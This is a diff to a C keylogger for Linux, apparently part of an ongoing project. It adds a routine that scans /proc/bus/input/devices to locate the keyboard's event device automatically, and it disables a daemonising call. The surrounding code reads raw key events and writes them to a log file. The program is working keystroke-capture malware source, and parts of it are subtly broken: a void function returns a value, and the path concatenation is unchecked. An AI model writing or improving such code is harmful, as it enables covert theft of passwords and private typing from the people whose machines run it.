@@ -5,8 +5,9 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <string.h>
 
-#define DEVICE_INPUT_PATH "/dev/input/event2"
+char DEVICE_INPUT_PATH[64] = "/dev/input/";
 
 char *key_map[] = {[KEY_RESERVED] = "[RESERVED]",
                      [KEY_ESC] = "[ESC]",
@@ -77,6 +78,7 @@ char *shift_key_map[] = {
       [KEY_COMMA] = "<", [KEY_DOT] = ">", [KEY_SLASH] = "?"};
 
 FILE *log_ptr = NULL;
+
 int fd;
 
 int caps_active = 0;
@@ -135,9 +137,43 @@ void cleanNexit(int sig) {
   exit(0);
 }
 
+void readingDevicesFile(){
+  FILE *fp = NULL;
+  long length;
+  char temp_eventX[16];
+  char buffer[256];
+
+  //opening the file
+  fp = fopen("/proc/bus/input/devices", "rb");
+  if (fp == NULL){
+    perror("Error opening /devices file");
+    return EXIT_FAILURE;
+  }
+
+  //reading the file into the buffer
+  while(fgets(buffer, sizeof(buffer), fp)){
+    char *e_ptr = strstr(buffer, "event");
+    if (e_ptr){
+      sscanf(e_ptr, "%s", temp_eventX);
+    }
+
+    if (strstr(buffer, "EV=120013")) {
+      strcat(DEVICE_INPUT_PATH, temp_eventX);
+    }
+  }
+
+  fclose(fp);
+}
+
+
+
 int main(int argc, char const *argv[])
 {
-    //opening /input file descriptor
+  printf("%s\n", DEVICE_INPUT_PATH);
+  readingDevicesFile();
+  printf("%s\n", DEVICE_INPUT_PATH);
+
+  //opening /input file descriptor
 	
   struct input_event ev;
   fd = open(DEVICE_INPUT_PATH, O_RDONLY);
@@ -148,7 +184,7 @@ int main(int argc, char const *argv[])
   printf("this is my fd: %d\n", fd);  
   close(fd);
 
-  make_daemon();
+  //make_daemon();
 
   signal(SIGINT, cleanNexit);
   signal(SIGTERM, cleanNexit);
@@ -165,8 +201,6 @@ int main(int argc, char const *argv[])
   {
    	perror("Error while opening log file");
   }
-
-
 
   while(1){
   	ssize_t bytes_read = read(fd, &ev, sizeof(ev));
